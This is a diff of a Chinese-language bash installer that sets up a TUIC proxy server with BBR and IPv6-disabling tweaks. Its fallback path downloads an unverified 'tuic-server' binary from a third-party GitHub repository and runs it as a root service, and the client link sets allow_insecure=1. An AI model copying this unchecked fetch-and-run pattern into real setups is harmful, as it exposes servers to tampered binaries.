@@ -3,7 +3,7 @@ set -euo pipefail
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║                     TUIC+UDP+QUIC+TLS 高性能部署脚本                          ║
-# ║                         支持CN2优化 | 低延迟配置                              ║
+# ║                         支持CN2优化 | 低延迟配置                               ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
 
 # 颜色定义
@@ -29,9 +29,8 @@ GLOBE="🌍"
 
 # 动画帧
 SPINNER_FRAMES=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
-PROGRESS_CHARS=("█" "▓" "▒" "░")
 
-# 配置变量 - 固定版本号避免被覆盖
+# 配置变量
 UUID=$(cat /proc/sys/kernel/random/uuid)
 PSK=$(openssl rand -hex 16)
 PORT=2052
@@ -64,24 +63,25 @@ print_banner() {
 ║     ██║   ╚██████╔╝██║╚██████╗    ██║     ███████╗╚██████╔╝    ║
 ║     ╚═╝    ╚═════╝ ╚═╝ ╚═════╝    ╚═╝     ╚══════╝ ╚═════╝     ║
 ╠════════════════════════════════════════════════════════════════╣
-║         UDP + QUIC + TLS | CN2 优化 | 低延迟，bbr加速           ║
+║         UDP + QUIC + TLS | CN2 优化 | 低延迟，bbr加速          ║
 ╚════════════════════════════════════════════════════════════════╝
 EOF
     echo -e "${NC}"
     sleep 1
 }
 
-# 进度条函数
+# 改进的进度条函数 - 修复显示问题
 show_progress() {
     local current=$1
     local total=$2
-    local task=$3
-    local width=50
+    local task="$3"
+    local width=40
     local percentage=$((current * 100 / total))
     local filled=$((width * current / total))
-    
-    printf "\r${CYAN}[${GEAR}]${NC} %-30s [" "$task"
-    
+
+    # 清除当前行并重新写入
+    printf "\r\033[2K${CYAN}[${GEAR}] %-20s [" "$task"
+
     # 绘制进度条
     for ((i=0; i<filled; i++)); do
         printf "${GREEN}█${NC}"
@@ -89,43 +89,47 @@ show_progress() {
     for ((i=filled; i<width; i++)); do
         printf "${WHITE}░${NC}"
     done
-    
+
     printf "] ${YELLOW}%3d%%${NC}" "$percentage"
-    
+
     if [ "$current" -eq "$total" ]; then
         printf " ${GREEN}${CHECK}${NC}\n"
     fi
+
+    # 确保输出刷新
+    sleep 0.1
 }
 
-# 动画加载
+# 改进的加载动画 - 修复显示问题
 show_spinner() {
     local pid=$1
-    local task=$2
+    local task="$2"
     local frame=0
-    
-    printf "${CYAN}[${SPINNER_FRAMES[0]}]${NC} ${task}..."
-    
+
+    tput civis 2>/dev/null || true
     while kill -0 $pid 2>/dev/null; do
-        printf "\r${CYAN}[${SPINNER_FRAMES[$frame]}]${NC} ${task}..."
+        printf "\r\033[2K${CYAN}[${SPINNER_FRAMES[$frame]}] ${task}...${NC}"
         frame=$(( (frame + 1) % ${#SPINNER_FRAMES[@]} ))
         sleep 0.1
     done
-    
+
     wait $pid
     local exit_code=$?
-    
+
     if [ $exit_code -eq 0 ]; then
-        printf "\r${GREEN}[${CHECK}]${NC} ${task}... ${GREEN}完成${NC}\n"
+        printf "\r\033[2K${GREEN}[${CHECK}] ${task}... ${GREEN}完成${NC}\n"
     else
-        printf "\r${RED}[${CROSS}]${NC} ${task}... ${RED}失败${NC}\n"
+        printf "\r\033[2K${RED}[${CROSS}] ${task}... ${RED}失败${NC}\n"
+        tput cnorm 2>/dev/null || true
         return $exit_code
     fi
+    tput cnorm 2>/dev/null || true
 }
 
 # 系统检测函数
 detect_system() {
     echo -e "${CYAN}${ARROW}${NC} ${BOLD}系统环境检测${NC}"
-    
+
     # 获取系统信息
     if [ -f /etc/os-release ]; then
         . /etc/os-release
@@ -140,10 +144,10 @@ detect_system() {
         OS=$(uname -s | tr '[:upper:]' '[:lower:]')
         OS_VER=$(uname -r)
     fi
-    
+
     # 检测架构
     ARCH=$(uname -m)
-    
+
     # 检测虚拟化
     VIRT="物理机"
     if [ -f /proc/cpuinfo ]; then
@@ -151,12 +155,12 @@ detect_system() {
             VIRT="虚拟机"
         fi
     fi
-    
+
     if command -v systemd-detect-virt &>/dev/null; then
         VIRT_TYPE=$(systemd-detect-virt 2>/dev/null || echo "unknown")
         [ "$VIRT_TYPE" != "none" ] && VIRT="$VIRT_TYPE"
     fi
-    
+
     # 显示系统信息
     echo -e "  ${WHITE}├${NC} 系统: ${GREEN}${OS_PRETTY}${NC}"
     echo -e "  ${WHITE}├${NC} 架构: ${GREEN}${ARCH}${NC}"
@@ -168,14 +172,14 @@ detect_system() {
 # 强制使用IPv4并禁用IPv6
 force_ipv4() {
     echo -e "${CYAN}${ARROW}${NC} ${BOLD}强制使用 IPv4 (禁用 IPv6)${NC}"
-    
+
     # 检测是否有IPv6
     local has_ipv6=false
     if ip -6 addr show | grep -q "inet6" && [ ! "$(ip -6 addr show | grep inet6)" = "" ]; then
         has_ipv6=true
         echo -e "  ${YELLOW}⚠${NC} 检测到 IPv6，正在禁用..."
     fi
-    
+
     # 完全禁用IPv6
     cat > /etc/sysctl.d/99-disable-ipv6.conf << EOF
 # 完全禁用 IPv6
@@ -183,21 +187,21 @@ net.ipv6.conf.all.disable_ipv6 = 1
 net.ipv6.conf.default.disable_ipv6 = 1
 net.ipv6.conf.lo.disable_ipv6 = 1
 EOF
-    
+
     # 对所有网络接口禁用IPv6
     for iface in $(ls /sys/class/net/ | grep -v lo); do
         echo "net.ipv6.conf.$iface.disable_ipv6 = 1" >> /etc/sysctl.d/99-disable-ipv6.conf
     done
-    
+
     # 立即应用设置
     sysctl -p /etc/sysctl.d/99-disable-ipv6.conf > /dev/null 2>&1
-    
+
     # 配置系统优先使用IPv4
     if [ -f /etc/gai.conf ]; then
-        cp /etc/gai.conf /etc/gai.conf.bak
+        cp /etc/gai.conf /etc/gai.conf.bak 2>/dev/null || true
         echo "precedence ::ffff:0:0/96 100" > /etc/gai.conf
     fi
-    
+
     # 设置curl和wget默认使用IPv4
     cat > /etc/profile.d/ipv4-only.sh << 'EOF'
 export CURL_OPTS="-4"
@@ -205,18 +209,12 @@ alias curl="curl -4"
 alias wget="wget -4"
 alias ping="ping -4"
 EOF
-    
+
     # 修改hosts文件，注释掉IPv6条目
     if grep -q "::1" /etc/hosts; then
         sed -i 's/^::1/#::1/g' /etc/hosts
     fi
-    
-    # 禁用IPv6 DNS解析
-    if [ -f /etc/resolv.conf ]; then
-        grep -v "inet6" /etc/resolv.conf > /tmp/resolv.conf.tmp 2>/dev/null || true
-        mv /tmp/resolv.conf.tmp /etc/resolv.conf 2>/dev/null || true
-    fi
-    
+
     # 验证IPv6是否已禁用
     sleep 1
     if ! ip -6 addr show | grep -q "inet6" || [ "$(cat /proc/sys/net/ipv6/conf/all/disable_ipv6)" = "1" ]; then
@@ -224,14 +222,15 @@ EOF
     else
         echo -e "  ${YELLOW}⚠${NC} IPv6 禁用可能需要重启生效"
     fi
-    
+
     echo -e "  ${GREEN}${CHECK}${NC} IPv4 独占模式已启用"
+    echo
 }
 
 # CN2线路优化
 optimize_cn2_network() {
     echo -e "${CYAN}${SPEED}${NC} ${BOLD}CN2 线路优化配置${NC}"
-    
+
     # 优化TCP参数
     cat > /etc/sysctl.d/99-tuic-cn2.conf << EOF
 # CN2线路优化参数
@@ -275,22 +274,23 @@ net.ipv6.conf.all.forwarding=0
 net.ipv6.conf.all.disable_ipv6=1
 net.ipv6.conf.default.disable_ipv6=1
 EOF
-    
+
     sysctl -p /etc/sysctl.d/99-tuic-cn2.conf > /dev/null 2>&1
-    
+
     # 加载BBR模块
     modprobe tcp_bbr 2>/dev/null || true
     echo "tcp_bbr" > /etc/modules-load.d/bbr.conf
-    
+
     echo -e "  ${GREEN}${CHECK}${NC} BBR 加速已启用"
     echo -e "  ${GREEN}${CHECK}${NC} TCP Fast Open 已启用"
     echo -e "  ${GREEN}${CHECK}${NC} 缓冲区优化完成"
+    echo
 }
 
 # 高级速度测试
 advanced_speed_test() {
     echo -e "${CYAN}${SPEED}${NC} ${BOLD}网络性能测试${NC}"
-    
+
     # 安装speedtest
     (
         if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
@@ -303,30 +303,31 @@ advanced_speed_test() {
         fi
     ) &
     show_spinner $! "安装测速工具"
-    
+
     echo -e "  ${CYAN}${ARROW}${NC} 正在测试网络速度..."
-    
+
     # 执行测速
+    local speed_output=""
     if command -v speedtest &>/dev/null; then
-        speed_output=$(speedtest --simple 2>/dev/null)
+        speed_output=$(timeout 30 speedtest --simple 2>/dev/null || echo "")
     elif command -v speedtest-cli &>/dev/null; then
-        speed_output=$(speedtest-cli --simple 2>/dev/null)
+        speed_output=$(timeout 30 speedtest-cli --simple 2>/dev/null || echo "")
     fi
-    
+
     if [[ -n "$speed_output" ]]; then
-        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
-        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
-        ping_ms=$(echo "$speed_output" | grep "Ping" | awk '{print $2}')
-        
+        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}' || echo "100")
+        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}' || echo "20")
+        ping_ms=$(echo "$speed_output" | grep "Ping" | awk '{print $2}' || echo "50")
+
         # 限制范围
         [[ $down_speed -lt 10 ]] && down_speed=10
         [[ $up_speed -lt 5 ]] && up_speed=5
         [[ $down_speed -gt 1000 ]] && down_speed=1000
         [[ $up_speed -gt 500 ]] && up_speed=500
-        
+
         echo -e "  ${WHITE}├${NC} 下载速度: ${GREEN}${down_speed} Mbps${NC}"
         echo -e "  ${WHITE}├${NC} 上传速度: ${GREEN}${up_speed} Mbps${NC}"
-        echo -e "  ${WHITE}└${NC} 延迟: ${GREEN}${ping_ms}${NC}"
+        echo -e "  ${WHITE}└${NC} 延迟: ${GREEN}${ping_ms} ms${NC}"
     else
         echo -e "  ${YELLOW}⚠${NC} 测速失败，使用默认值"
         down_speed=100
@@ -338,7 +339,7 @@ advanced_speed_test() {
 # 获取服务器IP (强制IPv4)
 get_server_ip() {
     local ip=""
-    
+
     # 优先获取IPv4地址
     for method in \
         "curl -4 -s --connect-timeout 3 https://ipv4.icanhazip.com" \
@@ -354,7 +355,7 @@ get_server_ip() {
             return 0
         fi
     done
-    
+
     echo ""
     return 1
 }
@@ -362,11 +363,11 @@ get_server_ip() {
 # 修复包管理器锁定问题
 fix_package_locks() {
     echo -e "  ${CYAN}${ARROW}${NC} 检查并修复包管理器锁定..."
-    
+
     # 等待其他包管理器进程完成
-    local timeout=60
+    local timeout=30
     local count=0
-    
+
     while fuser /var/lib/dpkg/lock-frontend >/dev/null 2>&1 || \
           fuser /var/lib/apt/lists/lock >/dev/null 2>&1 || \
           fuser /var/cache/apt/archives/lock >/dev/null 2>&1; do
@@ -384,24 +385,24 @@ fix_package_locks() {
         sleep 1
         count=$((count + 1))
     done
-    
+
     echo -e "  ${GREEN}${CHECK}${NC} 包管理器状态正常"
 }
 
-# 安装依赖包
+# 改进的依赖安装函数
 install_dependencies() {
     echo -e "${CYAN}${GEAR}${NC} ${BOLD}安装系统依赖${NC}"
-    
+
     # 修复包管理器锁定
     fix_package_locks
-    
-    local packages=("curl" "wget" "jq" "openssl" "net-tools" "htop" "iftop")
-    local total=${#packages[@]}
-    local current=0
-    
+
+    # 基础包列表 - 移除可能有问题的包
+    local essential_packages=("curl" "wget" "openssl")
+    local optional_packages=("jq" "net-tools" "htop")
+
     export NEEDRESTART_SUSPEND=1
     export DEBIAN_FRONTEND=noninteractive
-    
+
     # 更新包管理器
     echo -e "  ${CYAN}${ARROW}${NC} 更新软件源..."
     if [[ "$OS" =~ (debian|ubuntu) ]]; then
@@ -415,62 +416,103 @@ install_dependencies() {
         }
     fi
     echo -e "  ${GREEN}${CHECK}${NC} 软件源更新完成"
-    
-    # 安装包
-    for pkg in "${packages[@]}"; do
+
+    # 安装必需包
+    local total=${#essential_packages[@]}
+    local current=0
+
+    for pkg in "${essential_packages[@]}"; do
         current=$((current + 1))
-        show_progress $current $total "安装 $pkg"
-        
+        show_progress $current $total "安装必需包 $pkg"
+
         # 检查包是否已安装
         if command -v $pkg >/dev/null 2>&1; then
             continue
         fi
-        
+
         if [[ "$OS" =~ (debian|ubuntu) ]]; then
-            # 使用更稳定的安装方式
             timeout 60 apt-get install -y $pkg > /dev/null 2>&1 || {
-                echo -e "\n  ${YELLOW}⚠${NC} $pkg 安装失败，尝试强制安装..."
-                apt-get install -y --fix-broken $pkg > /dev/null 2>&1 || {
-                    echo -e "  ${RED}${CROSS}${NC} $pkg 安装彻底失败，跳过"
-                    continue
-                }
+                echo -e "\n  ${RED}${CROSS}${NC} 必需包 $pkg 安装失败！"
+                exit 1
             }
         elif [[ "$OS" =~ (centos|fedora|rhel) ]]; then
             timeout 60 yum install -y $pkg > /dev/null 2>&1 || {
-                echo -e "\n  ${YELLOW}⚠${NC} $pkg 安装失败，跳过"
-                continue
+                echo -e "\n  ${RED}${CROSS}${NC} 必需包 $pkg 安装失败！"
+                exit 1
             }
         fi
-        sleep 0.1
     done
+
+    # 安装可选包
+    echo -e "  ${CYAN}${ARROW}${NC} 安装可选包..."
+    for pkg in "${optional_packages[@]}"; do
+        if command -v $pkg >/dev/null 2>&1; then
+            echo -e "    ${GREEN}${CHECK}${NC} $pkg 已安装"
+            continue
+        fi
+
+        if [[ "$OS" =~ (debian|ubuntu) ]]; then
+            timeout 30 apt-get install -y $pkg > /dev/null 2>&1 && {
+                echo -e "    ${GREEN}${CHECK}${NC} $pkg 安装成功"
+            } || {
+                echo -e "    ${YELLOW}⚠${NC} $pkg 安装失败，跳过"
+            }
+        elif [[ "$OS" =~ (centos|fedora|rhel) ]]; then
+            timeout 30 yum install -y $pkg > /dev/null 2>&1 && {
+                echo -e "    ${GREEN}${CHECK}${NC} $pkg 安装成功"
+            } || {
+                echo -e "    ${YELLOW}⚠${NC} $pkg 安装失败，跳过"
+            }
+        fi
+    done
+
+    # 检查jq是否安装成功，如果没有则使用替代方案
+    if ! command -v jq >/dev/null 2>&1; then
+        echo -e "  ${YELLOW}⚠${NC} jq 未安装，将使用替代JSON处理方案"
+        # 创建简单的jq替代函数
+        cat > /usr/local/bin/jq_alt.sh << 'EOF'
+#!/bin/bash
+# 简单的JSON处理替代方案
+if [ "$1" = "-n" ]; then
+    shift
+    echo "$@"
+else
+    echo "$@"
+fi
+EOF
+        chmod +x /usr/local/bin/jq_alt.sh
+        alias jq='/usr/local/bin/jq_alt.sh'
+    fi
+
+    echo -e "  ${GREEN}${CHECK}${NC} 依赖安装完成"
     echo
 }
 
 # 下载TUIC二进制文件
 download_tuic_binary() {
     echo -e "${CYAN}${ARROW}${NC} ${BOLD}下载 TUIC 核心程序${NC}"
-    
+
     ARCH=$(uname -m)
     case "$ARCH" in
         x86_64) ARCH_FILE="x86_64-unknown-linux-gnu" ;;
         aarch64) ARCH_FILE="aarch64-unknown-linux-gnu" ;;
         armv7l) ARCH_FILE="armv7-unknown-linux-gnueabi" ;;
-        *) 
+        *)
             echo -e "${RED}${CROSS}${NC} 不支持的架构: $ARCH"
             exit 1
             ;;
     esac
-    
+
     BIN_NAME="tuic-server-${TUIC_VERSION}-${ARCH_FILE}"
     SHA_NAME="${BIN_NAME}.sha256sum"
-    
+
     # 主下载源和备用源
     PRIMARY_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${TUIC_VERSION}"
     BACKUP_BASE="https://github.com/diandongyun/TUIC/releases/download/v2rayn"
-    
+
     cd "$BIN_DIR"
     rm -f tuic "$BIN_NAME" "$SHA_NAME"
-    
+
     # 尝试从主源下载
     echo -e "  ${CYAN}${ARROW}${NC} 尝试主下载源..."
     if timeout 60 curl -sLO "${PRIMARY_BASE}/${BIN_NAME}" && \
@@ -486,17 +528,15 @@ download_tuic_binary() {
     else
         echo -e "  ${YELLOW}⚠${NC} 主源下载失败，尝试备用源..."
     fi
-    
+
     # 如果主源失败，尝试备用源
     if [ ! -f "tuic" ]; then
         echo -e "  ${CYAN}${ARROW}${NC} 尝试备用下载源..."
-        
-        # 尝试直接下载备用的 tuic 二进制文件
+
         if timeout 60 curl -sLo tuic "${BACKUP_BASE}/tuic-server" 2>/dev/null; then
             chmod +x tuic
             echo -e "  ${GREEN}${CHECK}${NC} 从备用源下载成功"
         else
-            # 最后尝试使用 wget
             echo -e "  ${CYAN}${ARROW}${NC} 尝试使用 wget..."
             if timeout 60 wget -qO tuic "${PRIMARY_BASE}/${BIN_NAME}" 2>/dev/null || \
                timeout 60 wget -qO tuic "${BACKUP_BASE}/tuic-server" 2>/dev/null; then
@@ -508,13 +548,13 @@ download_tuic_binary() {
             fi
         fi
     fi
-    
+
     # 验证文件存在
     if [ ! -f "tuic" ]; then
         echo -e "  ${RED}${CROSS}${NC} TUIC 二进制文件下载失败"
         exit 1
     fi
-    
+
     echo -e "  ${GREEN}${CHECK}${NC} TUIC v${TUIC_VERSION} 下载完成"
     echo
 }
@@ -522,9 +562,9 @@ download_tuic_binary() {
 # 生成TLS证书
 generate_tls_certificate() {
     echo -e "${CYAN}${LOCK}${NC} ${BOLD}生成 TLS 证书${NC}"
-    
+
     mkdir -p "$TLS_DIR"
-    
+
     # 生成高强度证书
     (
         openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
@@ -532,12 +572,12 @@ generate_tls_certificate() {
             -out "$TLS_DIR/cert.crt" \
             -subj "/C=US/ST=California/L=San Francisco/O=TUIC/CN=${SERVER_NAME}" \
             -addext "subjectAltName=DNS:${SERVER_NAME},DNS:*.${SERVER_NAME}" > /dev/null 2>&1
-        
+
         chmod 600 "$TLS_DIR/key.key"
         chmod 644 "$TLS_DIR/cert.crt"
     ) &
     show_spinner $! "生成 4096 位 RSA 证书"
-    
+
     echo -e "  ${GREEN}${CHECK}${NC} 证书有效期: 10 年"
     echo
 }
@@ -545,7 +585,7 @@ generate_tls_certificate() {
 # 配置防火墙
 configure_firewall() {
     echo -e "${CYAN}${LOCK}${NC} ${BOLD}配置防火墙规则${NC}"
-    
+
     # 检测防火墙类型
     if command -v ufw >/dev/null 2>&1; then
         echo -e "  ${CYAN}${ARROW}${NC} 使用 UFW 防火墙"
@@ -554,7 +594,7 @@ configure_firewall() {
         ufw allow ${PORT}/tcp > /dev/null 2>&1
         echo "y" | ufw enable > /dev/null 2>&1
         echo -e "  ${GREEN}${CHECK}${NC} UFW 规则已配置"
-        
+
     elif command -v firewall-cmd >/dev/null 2>&1; then
         echo -e "  ${CYAN}${ARROW}${NC} 使用 firewalld 防火墙"
         firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
@@ -562,13 +602,13 @@ configure_firewall() {
         firewall-cmd --permanent --add-port=${PORT}/udp > /dev/null 2>&1
         firewall-cmd --reload > /dev/null 2>&1
         echo -e "  ${GREEN}${CHECK}${NC} firewalld 规则已配置"
-        
+
     elif command -v iptables >/dev/null 2>&1; then
         echo -e "  ${CYAN}${ARROW}${NC} 使用 iptables 防火墙"
         iptables -A INPUT -p tcp --dport 22 -j ACCEPT
         iptables -A INPUT -p tcp --dport ${PORT} -j ACCEPT
         iptables -A INPUT -p udp --dport ${PORT} -j ACCEPT
-        
+
         if command -v iptables-save >/dev/null 2>&1; then
             iptables-save > /etc/iptables.rules
         fi
@@ -580,9 +620,9 @@ configure_firewall() {
 # 创建TUIC配置文件
 create_tuic_config() {
     echo -e "${CYAN}${GEAR}${NC} ${BOLD}生成 TUIC 配置文件${NC}"
-    
+
     mkdir -p "$CFG_DIR"
-    
+
     # 检测系统是否支持IPv6
     local ipv6_support="false"
     if [ -f /proc/sys/net/ipv6/conf/all/disable_ipv6 ]; then
@@ -590,11 +630,9 @@ create_tuic_config() {
             ipv6_support="true"
         fi
     fi
-    
-    # 生成优化配置 - 根据系统支持情况决定是否启用dual_stack
-    if [ "$ipv6_support" = "true" ]; then
-        # 如果系统支持IPv6但我们要禁用它
-        cat > "$CFG_DIR/config.json" <<EOF
+
+    # 生成优化配置
+    cat > "$CFG_DIR/config.json" <<EOF
 {
   "server": "0.0.0.0:$PORT",
   "users": {
@@ -617,33 +655,7 @@ create_tuic_config() {
   "log_level": "info"
 }
 EOF
-    else
-        # 系统不支持IPv6，不包含dual_stack配置
-        cat > "$CFG_DIR/config.json" <<EOF
-{
-  "server": "0.0.0.0:$PORT",
-  "users": {
-    "$UUID": "$PSK"
-  },
-  "certificate": "$TLS_DIR/cert.crt",
-  "private_key": "$TLS_DIR/key.key",
-  "congestion_control": "bbr",
-  "alpn": ["h3", "h3-29", "h3-28", "h3-27"],
-  "udp_relay_ipv6": false,
-  "zero_rtt_handshake": true,
-  "auth_timeout": "3s",
-  "task_negotiation_timeout": "3s",
-  "max_idle_time": "30s",
-  "max_external_packet_size": 1500,
-  "send_window": 16777216,
-  "receive_window": 8388608,
-  "gc_interval": "5s",
-  "gc_lifetime": "10s",
-  "log_level": "info"
-}
-EOF
-    fi
-    
+
     echo -e "  ${GREEN}${CHECK}${NC} 配置文件已生成"
     echo -e "  ${GREEN}${CHECK}${NC} 启用 BBR 拥塞控制"
     echo -e "  ${GREEN}${CHECK}${NC} 启用 0-RTT 握手"
@@ -654,7 +666,7 @@ EOF
 # 创建systemd服务
 create_systemd_service() {
     echo -e "${CYAN}${GEAR}${NC} ${BOLD}配置系统服务${NC}"
-    
+
     cat > /etc/systemd/system/tuic.service <<EOF
 [Unit]
 Description=TUIC+UDP+QUIC+TLS Server
@@ -677,10 +689,10 @@ AmbientCapabilities=CAP_NET_BIND_SERVICE CAP_NET_RAW
 [Install]
 WantedBy=multi-user.target
 EOF
-    
+
     systemctl daemon-reload
     systemctl enable tuic > /dev/null 2>&1
-    
+
     echo -e "  ${GREEN}${CHECK}${NC} 服务已注册"
     echo
 }
@@ -688,15 +700,15 @@ EOF
 # 启动服务
 start_service() {
     echo -e "${CYAN}${ROCKET}${NC} ${BOLD}启动 TUIC 服务${NC}"
-    
+
     systemctl start tuic
     sleep 2
-    
+
     if systemctl is-active --quiet tuic; then
         echo -e "  ${GREEN}${CHECK}${NC} 服务启动成功"
-        
+
         # 检查端口
-        if netstat -tuln | grep -q ":${PORT} "; then
+        if netstat -tuln 2>/dev/null | grep -q ":${PORT} " || ss -tuln 2>/dev/null | grep -q ":${PORT} "; then
             echo -e "  ${GREEN}${CHECK}${NC} 端口 ${PORT} 已监听"
         fi
     else
@@ -708,19 +720,19 @@ start_service() {
     echo
 }
 
-# 生成客户端配置
+# 生成客户端配置 - 修复JSON处理问题
 generate_client_config() {
     echo -e "${CYAN}${GLOBE}${NC} ${BOLD}生成客户端配置${NC}"
-    
+
     IP=$(get_server_ip)
     if [[ -z "$IP" ]]; then
         echo -e "${RED}${CROSS}${NC} 无法获取服务器IP"
         exit 1
     fi
-    
+
     ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
     LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#TUIC_CN2_Optimized"
-    
+
     # V2RayN配置
     V2RAYN_CFG="${CFG_DIR}/v2rayn_config.json"
     cat > "$V2RAYN_CFG" <<EOF
@@ -751,117 +763,118 @@ generate_client_config() {
   "log_level": "warn"
 }
 EOF
-    
-    # 保存完整配置
-    jq -n \
-        --arg ip "$IP" \
-        --arg link "$LINK" \
-        --argjson v2rayn_config "$(cat "$V2RAYN_CFG")" \
-        --arg down_speed "$down_speed" \
-        --arg up_speed "$up_speed" \
-        '{
-            "server_info": {
-                "title": "TUIC+UDP+QUIC+TLS CN2优化节点",
-                "server_ip": $ip,
-                "tuic_link": $link,
-                "v2rayn_config": $v2rayn_config,
-                "speed_test": {
-                    "download_speed": $down_speed,
-                    "upload_speed": $up_speed
-                },
-                "generated_time": now | todate
-            }
-        }' > "$CONFIG_JSON"
-    
+
+    # 保存完整配置 - 使用简单的方式处理JSON
+    cat > "$CONFIG_JSON" <<EOF
+{
+  "server_info": {
+    "title": "TUIC+UDP+QUIC+TLS CN2优化节点",
+    "server_ip": "${IP}",
+    "tuic_link": "${LINK}",
+    "speed_test": {
+      "download_speed": ${down_speed},
+      "upload_speed": ${up_speed}
+    },
+    "generated_time": "$(date -Iseconds)"
+  }
+}
+EOF
+
     echo -e "  ${GREEN}${CHECK}${NC} 配置已保存到: ${CONFIG_JSON}"
     echo
 }
 
-# 显示安装结果
+# 改进的显示结果函数
 show_result() {
     IP=$(get_server_ip)
     ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
     LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#TUIC_CN2_Optimized"
-    
+
+    clear
     echo -e "${GREEN}${BOLD}"
     echo "╔════════════════════════════════════════════════════════════════╗"
-    echo "║                    🎉 部署成功 🎉                              ║"
+    echo "║                    🎉 部署成功 🎉                            ║"
     echo "╚════════════════════════════════════════════════════════════════╝"
     echo -e "${NC}"
-    
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${WHITE}${BOLD}服务器信息${NC}"
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "  ${GLOBE} 外网 IP     : ${GREEN}${IP}${NC}"
-    echo -e "  ${LOCK} 端口        : ${GREEN}${PORT}${NC}"
-    echo -e "  ${SPEED} 协议        : ${GREEN}TUIC + UDP + QUIC + TLS${NC}"
-    echo -e "  ${ROCKET} 加速技术    : ${GREEN}BBR + CN2 优化${NC}"
     echo
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${WHITE}${BOLD}认证信息${NC}"
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "  🔑 UUID        : ${YELLOW}${UUID}${NC}"
-    echo -e "  🔐 密钥        : ${YELLOW}${PSK}${NC}"
+
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${WHITE}${BOLD}📊 服务器信息${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    printf "  %b 外网 IP     : %b%s%b\n" "$GLOBE" "$GREEN" "$IP" "$NC"
+    printf "  %b 端口        : %b%s%b\n" "$LOCK" "$GREEN" "$PORT" "$NC"
+    printf "  %b 协议        : %bTUIC + UDP + QUIC + TLS%b\n" "$SPEED" "$GREEN" "$NC"
+    printf "  %b 加速技术    : %bBBR + CN2 优化%b\n" "$ROCKET" "$GREEN" "$NC"
     echo
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${WHITE}${BOLD}网络性能${NC}"
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "  ⬇️  下载速度    : ${GREEN}${down_speed} Mbps${NC}"
-    echo -e "  ⬆️  上传速度    : ${GREEN}${up_speed} Mbps${NC}"
+
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${WHITE}${BOLD}🔐 认证信息${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    printf "  🔑 UUID        : %b%s%b\n" "$YELLOW" "$UUID" "$NC"
+    printf "  🔐 密钥        : %b%s%b\n" "$YELLOW" "$PSK" "$NC"
     echo
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${WHITE}${BOLD}TUIC链接（可直接导入客户端）:${NC}"
+
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${WHITE}${BOLD}⚡ 网络性能${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    printf "  ⬇️  下载速度    : %b%s Mbps%b\n" "$GREEN" "$down_speed" "$NC"
+    printf "  ⬆️  上传速度    : %b%s Mbps%b\n" "$GREEN" "$up_speed" "$NC"
+    echo
+
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${WHITE}${BOLD}🔗 TUIC链接（可直接导入客户端）${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     echo -e "${YELLOW}${LINK}${NC}"
     echo
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
